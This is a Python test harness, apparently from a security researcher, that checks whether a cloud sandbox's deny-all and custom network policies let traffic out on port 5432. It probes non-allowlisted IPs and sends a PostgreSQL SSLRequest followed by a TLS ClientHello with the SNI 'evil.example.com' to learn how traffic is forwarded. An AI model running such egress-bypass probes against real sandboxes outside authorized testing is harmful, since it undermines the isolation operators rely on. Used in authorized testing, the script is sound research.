# -*- coding: utf-8 -*-
"""Phase11: 5432 端口特殊放行验证 - 端口矩阵 + PG 链 TLS 转发语义"""
import sys, time, struct
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

GUEST = r'''
import socket, struct

def probe(ip, port, label=''):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        t0 = time.time()
        s.connect((ip, port))
        print('[%s %s:%d] CONNECT OK in %.2fs' % (label, ip, port, time.time()-t0), flush=True)
        s.close()
    except Exception as e:
        print('[%s %s:%d] EXC %s' % (label, ip, port, e), flush=True)

def pg_tls_chain(ip, port, hostname=None):
    # SSLRequest -> expect 'S' -> TLS ClientHello -> observe
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((ip, port))
        s.sendall(struct.pack('>II', 8, 80877103))
        r = s.recv(1)
        print('[chain %s:%d] after SSLRequest: %r' % (ip, port, r), flush=True)
        if r != b'S':
            s.close()
            return
        # TLS1.3 ClientHello with optional SNI
        body = b'\x03\x03' + b'\x22' * 32 + b'\x00' + b'\x00\x02\x13\x01' + b'\x01\x00'
        ext = b''
        if hostname:
            n = hostname.encode()
            sni = b'\x00' + bytes([len(n)]) + n
            ext += b'\x00\x00' + struct.pack('>H', len(sni)) + sni
        body += struct.pack('>H', len(ext)) + ext
        hs = b'\x01' + len(body).to_bytes(3, 'big') + body
        s.sendall(b'\x16\x03\x01' + struct.pack('>H', len(hs)) + hs)
        try:
            r2 = s.recv(300)
            print('[chain %s:%d] after CH: %r' % (ip, port, r2[:60]), flush=True)
        except socket.timeout:
            print('[chain %s:%d] after CH: TIMEOUT' % (ip, port), flush=True)
        s.close()
    except Exception as e:
        print('[chain %s:%d] EXC %s' % (ip, port, e), flush=True)

def raw_send(ip, port, data, label=''):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((ip, port))
        s.sendall(data)
        try:
            r = s.recv(300)
            print('[raw %s %s:%d] resp: %r' % (label, ip, port, r[:80]), flush=True)
        except socket.timeout:
            print('[raw %s %s:%d] TIMEOUT' % (label, ip, port), flush=True)
        s.close()
    except Exception as e:
        print('[raw %s %s:%d] EXC %s' % (label, ip, port, e), flush=True)

# 1) 非白名单 IP 端口矩阵 (custom webhook.site)
for p in [5432, 443, 80, 8080, 9999, 22]:
    probe('34.195.135.204', p, 'np-httpbin')
# 2) 第二个非白名单 IP 的 5432
probe('1.1.1.1', 5432, 'np-1111')
# 3) PG 链: 白名单 IP + 有服务 443, SNI 用非白名单域名 => 判别转发语义
pg_tls_chain('178.63.67.153', 443, hostname='evil.example.com')
# 4) PG 链: 非白名单 IP 5432
pg_tls_chain('34.195.135.204', 5432, hostname='httpbin.org')
# 5) 明文直发非白名单 5432
raw_send('34.195.135.204', 5432, b'GET / HTTP/1.0\r\nHost: x\r\n\r\n', 'plain-http')
print('done', flush=True)
'''

code = "cat > /tmp/pg19.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg19.py"

GUEST2 = r'''
import socket
def probe(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        print('[%s:%d] CONNECT OK' % (ip, port), flush=True)
        s.close()
    except Exception as e:
        print('[%s:%d] EXC %s' % (ip, port, e), flush=True)
# deny-all 下 5432 是否也特殊放行
probe('34.195.135.204', 5432)
probe('178.63.67.153', 5432)
probe('34.195.135.204', 443)
print('done', flush=True)
'''
code2 = "cat > /tmp/pg19b.py <<'PYEOF'\n" + GUEST2 + "\nPYEOF\npython3 /tmp/pg19b.py"

if __name__ == "__main__":
    SID = fresh_sandbox_deny_all("fwtest5")

    # 组1: deny-all 下 5432 行为 (关键: 若 5432 也放行 => High)
    c, r = cmd(SID, "bash", ["-lc", code2], timeout_ms=60000)
    print('cmd1(deny-all):', c, flush=True)
    print(r[:1500], flush=True)

    # 组2: custom webhook.site
    body = {"mode": "custom", "allowedDomains": ["webhook.site"]}
    c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (SID, TEAM), body)
    print('set custom:', c, flush=True)
    time.sleep(2)
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=90000)
    print('cmd2(custom):', c, flush=True)
    print(r[:4500], flush=True)
